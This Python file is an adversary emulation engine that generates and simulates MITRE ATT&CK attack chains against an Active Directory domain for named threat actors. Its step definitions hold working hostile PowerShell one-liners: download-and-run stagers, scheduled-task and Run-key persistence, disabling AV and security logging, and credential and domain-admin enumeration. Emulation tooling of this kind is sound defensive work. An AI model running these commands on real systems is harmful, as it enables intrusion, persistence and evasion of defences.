"""
ATHENA Adversary Emulation Engine

Production-ready CALDERA-style operator that generates realistic multi-stage
MITRE ATT&CK attack chains for an Active Directory environment.
"""

from __future__ import annotations

import asyncio
import csv
import json
import logging
import os
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Literal, Optional, Sequence, Tuple


Platform = Literal["windows", "linux", "macos"]
StepStatus = Literal["planned", "running", "success", "failed", "skipped"]


@dataclass(frozen=True)
class StepTiming:
    """Timing controls for simulation/execution."""

    delay_seconds: float
    duration_seconds: float


@dataclass(frozen=True)
class AttackStep:
    """A single ATT&CK-aligned action."""

    tactic: str
    technique_id: str
    technique_name: str
    description: str
    command: str
    expected_result: str
    platform: Platform
    timing: StepTiming


@dataclass(frozen=True)
class MissionLogEntry:
    """Immutable log entry for an executed step."""

    timestamp: str
    threat_actor: str
    step: Dict[str, Any]
    status: StepStatus
    artifacts: Dict[str, Any] = field(default_factory=dict)


def _utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _setup_logger() -> logging.Logger:
    logger = logging.getLogger("athena.caldera.operator")
    if logger.handlers:
        return logger

    logger.setLevel(logging.INFO)
    handler = logging.StreamHandler()
    formatter = logging.Formatter(
        fmt="%(asctime)s %(levelname)s %(name)s - %(message)s",
        datefmt="%Y-%m-%dT%H:%M:%S%z",
    )
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.propagate = False
    return logger


@dataclass(frozen=True)
class MCDMCriteria:
    """
    Multi-Criteria Decision Making (MCDM) criteria for selecting among technique variants.

    Scores are 0-10 per dimension.
    """

    stealth: float
    reliability: float
    impact: float
    speed: float
    complexity: float


@dataclass(frozen=True)
class MCDMWeights:
    """Weights (0-1) used to score criteria."""

    stealth: float = 0.25
    reliability: float = 0.25
    impact: float = 0.25
    speed: float = 0.15
    complexity: float = 0.10  # lower complexity is better (handled in scoring)


@dataclass(frozen=True)
class TechniqueVariant:
    """
    A selectable variant for a given tactic that produces an AttackStep.

    The MCDM layer uses `criteria` to choose the best-fit variant for an actor profile.
    """

    step: AttackStep
    criteria: MCDMCriteria
    tags: Tuple[str, ...] = ()


@dataclass(frozen=True)
class ThreatActorProfile:
    name: str
    weights: MCDMWeights
    defaults: Dict[str, str] = field(default_factory=dict)
    preferred_tags: Tuple[str, ...] = ()


class AdversaryOperator:
    """
    Generates and (optionally) simulates execution of ATT&CK attack chains.

    - Generates 12+ steps covering the full attack lifecycle.
    - Async-ready: use `execute_attack_chain` to simulate timing with `await`.
    - Maintains `self.mission_log` for downstream ingestion.
    """

    def __init__(self, *, output_path: Optional[Path] = None) -> None:
        self.logger = _setup_logger()
        self.attack_chain: List[AttackStep] = []
        self.mission_log: List[Dict[str, Any]] = []
        self.output_path = output_path or Path("src/caldera-simulator/attack_chain.json")

    def _get_threat_actor_profile(self, threat_actor: str) -> ThreatActorProfile:
        actor = (threat_actor or "UNKNOWN").strip().upper()

        # Actor-specific weights and defaults are pragmatic and tuneable.
        profiles: Dict[str, ThreatActorProfile] = {
            "APT28": ThreatActorProfile(
                name="APT28",
                weights=MCDMWeights(stealth=0.30, reliability=0.20, impact=0.25, speed=0.10, complexity=0.15),
                defaults={"c2_uri": "https://updates-cdn.example/api/v2/beacon", "exfil_stage": r"C:\ProgramData\winupd.dat"},
                preferred_tags=("stealthy", "living_off_the_land"),
            ),
            "EMOTET": ThreatActorProfile(
                name="EMOTET",
                weights=MCDMWeights(stealth=0.15, reliability=0.30, impact=0.20, speed=0.25, complexity=0.10),
                defaults={"c2_uri": "https://cdn-sync.example/api/v1/ping", "exfil_stage": r"C:\ProgramData\cache.zip"},
                preferred_tags=("fast", "commodity"),
            ),
            "LAZARUS": ThreatActorProfile(
                name="LAZARUS",
                weights=MCDMWeights(stealth=0.25, reliability=0.20, impact=0.35, speed=0.10, complexity=0.10),
                defaults={"c2_uri": "https://telemetry.example/api/v1/health", "exfil_stage": r"C:\ProgramData\diag.bin"},
                preferred_tags=("high_impact", "targeted"),
            ),
        }

        return profiles.get(
            actor,
            ThreatActorProfile(
                name=actor if actor else "UNKNOWN",
                weights=MCDMWeights(),
                defaults={"c2_uri": "https://cdn-updates.example/api/v1/beacon", "exfil_stage": r"C:\ProgramData\cache.zip"},
                preferred_tags=(),
            ),
        )

    def _mcdm_score(self, variant: TechniqueVariant, profile: ThreatActorProfile) -> float:
        c = variant.criteria
        w = profile.weights

        # Complexity is inverted (lower is better), normalize to 0-10 scale.
        complexity_benefit = max(0.0, 10.0 - float(c.complexity))

        base = (
            float(c.stealth) * w.stealth
            + float(c.reliability) * w.reliability
            + float(c.impact) * w.impact
            + float(c.speed) * w.speed
            + complexity_benefit * w.complexity
        )

        # Mild boost if variant tags align with actor preferences.
        if profile.preferred_tags and variant.tags:
            overlap = len(set(profile.preferred_tags).intersection(set(variant.tags)))
            base += min(1.0, 0.25 * overlap)

        return round(base, 3)

    def _select_variant(self, variants: Sequence[TechniqueVariant], profile: ThreatActorProfile) -> TechniqueVariant:
        scored = [(self._mcdm_score(v, profile), v) for v in variants]
        scored.sort(key=lambda x: x[0], reverse=True)
        best_score, best_variant = scored[0]
        self.logger.info("Technique prioritized: actor=%s tactic=%s score=%.3f", profile.name, best_variant.step.tactic, best_score)
        return best_variant

    def generate_attack_chain(self, threat_actor: str) -> List[Dict[str, Any]]:
        """
        Generate a multi-stage attack chain (12 steps minimum) for an AD environment.

        Returns:
            JSON-serializable list of attack steps (dicts).
        """
        profile = self._get_threat_actor_profile(threat_actor)

        # Technique variants per tactic. MCDM selects the best-fit option for the actor.
        recon_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Reconnaissance",
                    technique_id="T1592.002",
                    technique_name="Gather Victim Host Information: Software",
                    description="Enumerate OS and endpoint security products to inform targeting and evasion.",
                    command=(
                        r'powershell -NoP -W Hidden -C "'
                        r'Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber; '
                        r'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct '
                        r'| Select-Object displayName,productState"'
                    ),
                    expected_result="OS details and AV products collected (name/state) for situational awareness.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=6.0),
                ),
                criteria=MCDMCriteria(stealth=8, reliability=9, impact=4, speed=7, complexity=3),
                tags=("living_off_the_land", "stealthy"),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Reconnaissance",
                    technique_id="T1018",
                    technique_name="Remote System Discovery",
                    description="Enumerate nearby systems via AD/DNS to identify lateral movement targets.",
                    command=r'powershell -NoP -W Hidden -C "nltest /dclist:corp.local; nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local"',
                    expected_result="Domain controllers and service records discovered for targeting.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=5.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=8, impact=5, speed=7, complexity=4),
                tags=("targeted",),
            ),
        ]

        initial_access_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Initial Access",
                    technique_id="T1566.001",
                    technique_name="Phishing: Spearphishing Attachment",
                    description="Stage a macro-lure attachment delivery (simulated) to represent initial access.",
                    command=r'powershell -NoP -W Hidden -C "$lure=''Invoice_Q1_2026.xlsm''; Write-Output (''Staged lure: ''+$lure)"',
                    expected_result="Lure staged; user execution is assumed in this simulation.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=2.0),
                ),
                criteria=MCDMCriteria(stealth=6, reliability=7, impact=6, speed=8, complexity=4),
                tags=("commodity", "fast"),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Initial Access",
                    technique_id="T1190",
                    technique_name="Exploit Public-Facing Application",
                    description="Simulate exploitation of a public-facing web app to obtain initial foothold.",
                    command=r'powershell -NoP -W Hidden -C "Write-Output ''Simulating web app exploit chain against https://vpn.corp.local (no-op)''"',
                    expected_result="Foothold obtained on edge host if vulnerable; otherwise logged as blocked.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=3.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=5, impact=7, speed=6, complexity=7),
                tags=("targeted", "high_impact"),
            ),
        ]

        execution_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Execution",
                    technique_id="T1059.001",
                    technique_name="Command and Scripting Interpreter: PowerShell",
                    description="Execute a PowerShell stager (simulated) to represent in-memory payload execution.",
                    command=r'powershell -NoP -W Hidden -C "$s=''IEX (New-Object Net.WebClient).DownloadString(''''http://intranet.local/update.ps1'''')''; Write-Output ''Stager prepared''"',
                    expected_result="Stager logic invoked; remote script retrieval would occur in a real engagement.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.5, duration_seconds=4.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=8, impact=6, speed=7, complexity=4),
                tags=("living_off_the_land",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Execution",
                    technique_id="T1204.002",
                    technique_name="User Execution: Malicious File",
                    description="Represent user execution of a staged file leading to process spawn.",
                    command=r'powershell -NoP -W Hidden -C "Write-Output ''Simulating user execution of dropped loader (no-op)''"',
                    expected_result="Process execution event generated and logged (simulation).",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=3.0),
                ),
                criteria=MCDMCriteria(stealth=5, reliability=7, impact=6, speed=8, complexity=3),
                tags=("commodity", "fast"),
            ),
        ]

        persistence_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Persistence",
                    technique_id="T1053.005",
                    technique_name="Scheduled Task/Job: Scheduled Task",
                    description="Create a scheduled task to re-run the stager at logon (simulated).",
                    command=(
                        r'powershell -NoP -W Hidden -C "'
                        r"schtasks /Create /SC ONLOGON /TN 'WindowsUpdateCheck' "
                        r"/TR ""powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://intranet.local/u.ps1')"" "
                        r"/F"""
                        r'"'
                    ),
                    expected_result="Scheduled task present and configured to execute at user logon.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=3.0),
                ),
                criteria=MCDMCriteria(stealth=6, reliability=9, impact=5, speed=7, complexity=4),
                tags=("living_off_the_land",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Persistence",
                    technique_id="T1547.001",
                    technique_name="Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
                    description="Simulate persistence via HKCU Run key for user-level autostart.",
                    command=r'powershell -NoP -W Hidden -C "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /t REG_SZ /d ''powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString(''''http://intranet.local/u.ps1'''')'' /f"',
                    expected_result="Run key established to execute on user logon.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=3.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=8, impact=5, speed=7, complexity=4),
                tags=("stealthy",),
            ),
        ]

        priv_esc_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Privilege Escalation",
                    technique_id="T1548.002",
                    technique_name="Abuse Elevation Control Mechanism: Bypass User Account Control",
                    description="Simulate a UAC bypass attempt via fodhelper-style registry hijack (no-op).",
                    command=r'powershell -NoP -W Hidden -C "Write-Output ''Simulating UAC bypass via fodhelper registry hijack''"',
                    expected_result="Elevated execution attempted; may succeed only if host configuration is vulnerable.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=5.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=5, impact=6, speed=6, complexity=6),
                tags=("stealthy",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Privilege Escalation",
                    technique_id="T1068",
                    technique_name="Exploitation for Privilege Escalation",
                    description="Simulate local privilege escalation exploit attempt (no-op).",
                    command=r'powershell -NoP -W Hidden -C "Write-Output ''Simulating local privilege escalation exploit attempt (no-op)''"',
                    expected_result="Privilege escalation attempt recorded; success depends on vulnerability presence.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=6.0),
                ),
                criteria=MCDMCriteria(stealth=6, reliability=4, impact=8, speed=5, complexity=8),
                tags=("high_impact",),
            ),
        ]

        defense_evasion_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Defense Evasion",
                    technique_id="T1562.001",
                    technique_name="Impair Defenses: Disable or Modify Tools",
                    description="Attempt to reduce detection via AV exclusions and security log tampering (simulated).",
                    command=r'powershell -NoP -W Hidden -C "Add-MpPreference -ExclusionPath ''C:\ProgramData\Microsoft\Windows\Caches'' -ErrorAction SilentlyContinue; wevtutil sl Security /e:false 2>$null; Write-Output ''Evasion actions attempted''"',
                    expected_result="Evasion actions attempted; expected to be partially blocked in hardened environments.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=4.0),
                ),
                criteria=MCDMCriteria(stealth=5, reliability=6, impact=6, speed=7, complexity=5),
                tags=("fast",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Defense Evasion",
                    technique_id="T1036.005",
                    technique_name="Masquerading: Match Legitimate Name or Location",
                    description="Simulate dropping/renaming a binary to appear legitimate in common directories.",
                    command=r'powershell -NoP -W Hidden -C "$p=''C:\ProgramData\Microsoft\Windows\Caches\svch0st.exe''; Write-Output (''Simulating masquerade drop: ''+$p)"',
                    expected_result="Masqueraded artifact path created/recorded for downstream telemetry simulation.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=3.0),
                ),
                criteria=MCDMCriteria(stealth=8, reliability=8, impact=5, speed=6, complexity=4),
                tags=("stealthy", "living_off_the_land"),
            ),
        ]

        cred_access_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Credential Access",
                    technique_id="T1003.001",
                    technique_name="OS Credential Dumping: LSASS Memory",
                    description="Simulate credential dumping intent and generate placeholder artifacts (no Mimikatz).",
                    command=r'powershell -NoP -W Hidden -C "Write-Output ''Simulating LSASS access attempt (artifact placeholder)''"',
                    expected_result="Credential artifact placeholder produced for downstream simulation steps.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=6.0),
                ),
                criteria=MCDMCriteria(stealth=4, reliability=7, impact=9, speed=5, complexity=7),
                tags=("high_impact",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Credential Access",
                    technique_id="T1552.002",
                    technique_name="Unsecured Credentials: Credentials in Registry",
                    description="Simulate searching the registry for stored credentials/config values (safer LoTL).",
                    command=r'powershell -NoP -W Hidden -C "reg query HKCU\Software /s /f password 2>$null | Select-Object -First 20"',
                    expected_result="Potential credential strings discovered in registry queries (simulation).",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.5, duration_seconds=5.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=6, impact=6, speed=6, complexity=4),
                tags=("stealthy", "living_off_the_land"),
            ),
        ]

        discovery_account_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Discovery",
                    technique_id="T1087.002",
                    technique_name="Account Discovery: Domain Account",
                    description="Enumerate domain users and Domain Admins membership.",
                    command=r'powershell -NoP -W Hidden -C "whoami; net user /domain; net group ''Domain Admins'' /domain"',
                    expected_result="Domain users enumerated and privileged group membership identified.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.5, duration_seconds=5.0),
                ),
                criteria=MCDMCriteria(stealth=6, reliability=9, impact=6, speed=7, complexity=3),
                tags=("living_off_the_land",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Discovery",
                    technique_id="T1069.002",
                    technique_name="Permission Groups Discovery: Domain Groups",
                    description="Enumerate domain groups to identify targets for privilege escalation.",
                    command=r'powershell -NoP -W Hidden -C "net group /domain | Select-Object -First 50"',
                    expected_result="Domain groups enumerated for privilege target selection.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.5, duration_seconds=4.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=8, impact=5, speed=7, complexity=3),
                tags=("stealthy",),
            ),
        ]

        discovery_network_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Discovery",
                    technique_id="T1016",
                    technique_name="System Network Configuration Discovery",
                    description="Enumerate IP config, routes, and neighbor info to map network paths.",
                    command=r'powershell -NoP -W Hidden -C "ipconfig /all; route print; arp -a"',
                    expected_result="Network configuration and routing information collected.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=4.0),
                ),
                criteria=MCDMCriteria(stealth=6, reliability=9, impact=4, speed=8, complexity=2),
                tags=("fast",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Discovery",
                    technique_id="T1046",
                    technique_name="Network Service Scanning",
                    description="Simulate identifying live hosts and common services (minimal footprint).",
                    command=r'powershell -NoP -W Hidden -C "$subnet=''192.168.1.''; 1..5 | % {Test-Connection -Count 1 -Quiet ($subnet+$_) | % {$_}}; Write-Output ''Simulated scan summary''"',
                    expected_result="Live host presence inferred and recorded (simulation).",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=6.0),
                ),
                criteria=MCDMCriteria(stealth=5, reliability=7, impact=5, speed=6, complexity=4),
                tags=("commodity",),
            ),
        ]

        lateral_movement_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Lateral Movement",
                    technique_id="T1021.001",
                    technique_name="Remote Services: Remote Desktop Protocol",
                    description="Simulate lateral movement via RDP to a file server using obtained credentials.",
                    command=r'powershell -NoP -W Hidden -C "$target=''FS01.corp.local''; Write-Output (''Simulating RDP session to ''+$target)"',
                    expected_result="Remote access established if reachability and credentials allow.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.5, duration_seconds=6.0),
                ),
                criteria=MCDMCriteria(stealth=5, reliability=7, impact=7, speed=6, complexity=5),
                tags=("commodity",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Lateral Movement",
                    technique_id="T1021.006",
                    technique_name="Remote Services: Windows Remote Management",
                    description="Simulate WinRM-based lateral movement (LoTL) to a server.",
                    command=r'powershell -NoP -W Hidden -C "$t=''FS01.corp.local''; Write-Output (''Simulating WinRM session to ''+$t)"',
                    expected_result="Remote command execution channel established if WinRM enabled and creds valid.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=5.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=7, impact=7, speed=7, complexity=5),
                tags=("living_off_the_land", "stealthy"),
            ),
        ]

        collection_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Collection",
                    technique_id="T1005",
                    technique_name="Data from Local System",
                    description="Identify potentially sensitive documents for collection and staging.",
                    command=r'powershell -NoP -W Hidden -C "Get-ChildItem -Path ''C:\\Users'' -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue | Select-Object -First 25 FullName"',
                    expected_result="Candidate documents enumerated for collection (paths listed).",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=8.0),
                ),
                criteria=MCDMCriteria(stealth=6, reliability=8, impact=7, speed=6, complexity=3),
                tags=(),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Collection",
                    technique_id="T1114.002",
                    technique_name="Email Collection: Remote Email Collection",
                    description="Simulate collecting mailbox metadata from Outlook profile locations.",
                    command=r'powershell -NoP -W Hidden -C "Get-ChildItem -Path $env:APPDATA\Microsoft\Outlook -ErrorAction SilentlyContinue | Select-Object -First 20 Name,Length"',
                    expected_result="Outlook artifacts enumerated for targeted email collection (simulation).",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=6.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=7, impact=6, speed=7, complexity=3),
                tags=("targeted",),
            ),
        ]

        exfiltration_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Exfiltration",
                    technique_id="T1041",
                    technique_name="Exfiltration Over C2 Channel",
                    description="Stage an archive and simulate exfiltration over the established channel.",
                    command=rf'powershell -NoP -W Hidden -C "$stage=''{profile.defaults["exfil_stage"]}''; Write-Output (''Staged archive: ''+$stage); Write-Output ''Simulating upload over C2 channel''"',
                    expected_result="Data staged and exfil attempt recorded (simulation).",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=5.0),
                ),
                criteria=MCDMCriteria(stealth=6, reliability=7, impact=8, speed=6, complexity=4),
                tags=("high_impact",),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Exfiltration",
                    technique_id="T1567.002",
                    technique_name="Exfiltration to Cloud Storage",
                    description="Simulate exfiltration to a cloud endpoint using HTTPS (no actual upload).",
                    command=r'powershell -NoP -W Hidden -C "Write-Output ''Simulating exfil to cloud storage endpoint (no-op)''"',
                    expected_result="Cloud exfil attempt recorded for correlation (simulation).",
                    platform="windows",
                    timing=StepTiming(delay_seconds=2.0, duration_seconds=4.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=6, impact=7, speed=6, complexity=5),
                tags=("stealthy",),
            ),
        ]

        c2_variants: Sequence[TechniqueVariant] = [
            TechniqueVariant(
                step=AttackStep(
                    tactic="Command and Control",
                    technique_id="T1071.001",
                    technique_name="Application Layer Protocol: Web Protocols",
                    description="Maintain HTTPS beaconing with jitter (simulated) to represent C2 keepalive.",
                    command=rf'powershell -NoP -W Hidden -C "$uri=''{profile.defaults["c2_uri"]}''; Write-Output (''Beaconing to ''+$uri+'' with jitter'')"',
                    expected_result="C2 beacon activity represented; periodic check-ins are simulated.",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=10.0),
                ),
                criteria=MCDMCriteria(stealth=7, reliability=8, impact=7, speed=6, complexity=4),
                tags=("stealthy", "living_off_the_land"),
            ),
            TechniqueVariant(
                step=AttackStep(
                    tactic="Command and Control",
                    technique_id="T1095",
                    technique_name="Non-Application Layer Protocol",
                    description="Simulate fallback C2 over raw TCP to represent resilience (no traffic).",
                    command=r'powershell -NoP -W Hidden -C "Write-Output ''Simulating raw TCP C2 fallback (no-op)''"',
                    expected_result="Fallback C2 channel represented (simulation).",
                    platform="windows",
                    timing=StepTiming(delay_seconds=1.0, duration_seconds=8.0),
                ),
                criteria=MCDMCriteria(stealth=5, reliability=6, impact=6, speed=6, complexity=6),
                tags=("commodity",),
            ),
        ]

        selected_variants: List[TechniqueVariant] = [
            self._select_variant(recon_variants, profile),
            self._select_variant(initial_access_variants, profile),
            self._select_variant(execution_variants, profile),
            self._select_variant(persistence_variants, profile),
            self._select_variant(priv_esc_variants, profile),
            self._select_variant(defense_evasion_variants, profile),
            self._select_variant(cred_access_variants, profile),
            self._select_variant(discovery_account_variants, profile),
            self._select_variant(discovery_network_variants, profile),
            self._select_variant(lateral_movement_variants, profile),
            self._select_variant(collection_variants, profile),
            self._select_variant(exfiltration_variants, profile),
            self._select_variant(c2_variants, profile),
        ]

        steps: List[AttackStep] = [v.step for v in selected_variants]

        if len(steps) < 12:
            raise ValueError("Attack chain must contain at least 12 steps.")

        self.attack_chain = list(steps)
        chain_dicts: List[Dict[str, Any]] = []
        for variant in selected_variants:
            step_dict = asdict(variant.step)
            step_dict["mcdm"] = {
                "score": self._mcdm_score(variant, profile),
                "criteria": asdict(variant.criteria),
                "tags": list(variant.tags),
                "actor": profile.name,
            }
            chain_dicts.append(step_dict)

        self.logger.info("Generated attack chain: actor=%s steps=%d", profile.name, len(chain_dicts))
        self._write_chain(chain_dicts)
        return chain_dicts

    async def execute_attack_chain(self, threat_actor: str) -> List[Dict[str, Any]]:
        """
        Simulate step execution asynchronously using each step's timing.

        This function does not execute commands on the host; it sleeps to model
        delays/durations and emits structured mission log entries for ingestion.
        """
        chain = self.generate_attack_chain(threat_actor)
        profile = self._get_threat_actor_profile(threat_actor)
        actor = profile.name

        for idx, step in enumerate(chain, start=1):
            await asyncio.sleep(float(step["timing"]["delay_seconds"]))

            self.logger.info(
                "Executing step %d/%d: %s - %s (%s)",
                idx,
                len(chain),
                step["tactic"],
                step["technique_name"],
                step["technique_id"],
            )

            artifacts: Dict[str, Any] = {
                "host": os.environ.get("ATHENA_HOST", "WS-01"),
                "domain": os.environ.get("ATHENA_DOMAIN", "corp.local"),
                "user": os.environ.get("ATHENA_USER", r"CORP\j.doe"),
                "command_preview": step["command"][:180],
                "simulated": True,
                "threat_actor": actor,
            }

            if step["tactic"] == "Credential Access":
                artifacts.update(
                    {
                        "credential_type": "ntlm_hash",
                        "credential_material": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99",
                        "note": "Placeholder hash for simulation only.",
                    }
                )
            elif step["tactic"] in {"Discovery", "Reconnaissance"}:
                artifacts.update({"telemetry": {"event_count": 3, "sources": ["process", "powershell", "net"]}})
            elif step["tactic"] == "Lateral Movement":
                artifacts.update({"target_host": "FS01.corp.local", "remote_service": "rdp"})
            elif step["tactic"] == "Exfiltration":
                artifacts.update(
                    {
                        "staged_file": profile.defaults.get("exfil_stage", r"C:\ProgramData\cache.zip"),
                        "bytes": 5242880,
                    }
                )

            status: StepStatus = "success"
            if step["tactic"] == "Defense Evasion":
                artifacts.update({"blocked_actions": ["wevtutil Security disable (may require admin)"]})

            self.log_attack_execution(step=step, status=status, artifacts=artifacts, threat_actor=actor)
            await asyncio.sleep(float(step["timing"]["duration_seconds"]))

        self.logger.info("Execution simulation complete: actor=%s log_entries=%d", actor, len(self.mission_log))
        return self.mission_log

    def export_to_csv(self, output_csv: Path) -> Path:
        """
        Export `self.mission_log` entries to CSV.

        - Flattens common step fields into columns.
        - Stores `artifacts` and nested `step` as JSON strings for fidelity.
        """
        output_csv.parent.mkdir(parents=True, exist_ok=True)

        fieldnames = [
            "timestamp",
            "threat_actor",
            "status",
            "tactic",
            "technique_id",
            "technique_name",
            "platform",
            "delay_seconds",
            "duration_seconds",
            "description",
            "command",
            "expected_result",
            "mcdm_score",
            "artifacts_json",
            "step_json",
        ]

        with output_csv.open("w", encoding="utf-8", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()

            for entry in self.mission_log:
                step = entry.get("step", {}) or {}
                timing = step.get("timing", {}) or {}
                mcdm = step.get("mcdm", {}) or {}

                writer.writerow(
                    {
                        "timestamp": entry.get("timestamp", ""),
                        "threat_actor": entry.get("threat_actor", ""),
                        "status": entry.get("status", ""),
                        "tactic": step.get("tactic", ""),
                        "technique_id": step.get("technique_id", ""),
                        "technique_name": step.get("technique_name", ""),
                        "platform": step.get("platform", ""),
                        "delay_seconds": timing.get("delay_seconds", ""),
                        "duration_seconds": timing.get("duration_seconds", ""),
                        "description": step.get("description", ""),
                        "command": step.get("command", ""),
                        "expected_result": step.get("expected_result", ""),
                        "mcdm_score": mcdm.get("score", ""),
                        "artifacts_json": json.dumps(entry.get("artifacts", {}) or {}, ensure_ascii=False),
                        "step_json": json.dumps(step, ensure_ascii=False),
                    }
                )

        self.logger.info("Mission log exported: path=%s entries=%d", str(output_csv), len(self.mission_log))
        return output_csv

    def log_attack_execution(
        self,
        step: Dict[str, Any],
        status: StepStatus,
        artifacts: Dict[str, Any],
        *,
        threat_actor: str,
    ) -> None:
        """
        Log an execution record for a given step.

        Maintains:
            self.mission_log: list of JSON-serializable dict entries.
        """
        entry = MissionLogEntry(
            timestamp=_utc_now_iso(),
            threat_actor=threat_actor,
            step=step,
            status=status,
            artifacts=artifacts or {},
        )
        self.mission_log.append(asdict(entry))

        self.logger.info(
            "Mission log appended: actor=%s status=%s technique=%s",
            threat_actor,
            status,
            step.get("technique_id"),
        )

    def _write_chain(self, chain_dicts: List[Dict[str, Any]]) -> None:
        self.output_path.parent.mkdir(parents=True, exist_ok=True)
        with self.output_path.open("w", encoding="utf-8") as f:
            json.dump(chain_dicts, f, indent=2)
        self.logger.info("Attack chain saved: path=%s", str(self.output_path))


if __name__ == "__main__":
    # Example usage:
    # - Generates a chain and writes it to `src/caldera-simulator/attack_chain.json`
    # - Simulates async execution and prints the last mission log entry
    operator = AdversaryOperator()

    chain = operator.generate_attack_chain(threat_actor="APT29")
    print(f"Generated {len(chain)} steps. Output written to {operator.output_path}")

    async def _run() -> None:
        mission_log = await operator.execute_attack_chain(threat_actor="APT29")
        print(f"Mission log entries: {len(mission_log)}")
        if mission_log:
            print(json.dumps(mission_log[-1], indent=2))
        operator.export_to_csv(Path("src/caldera-simulator/mission_log.csv"))

    asyncio.run(_run())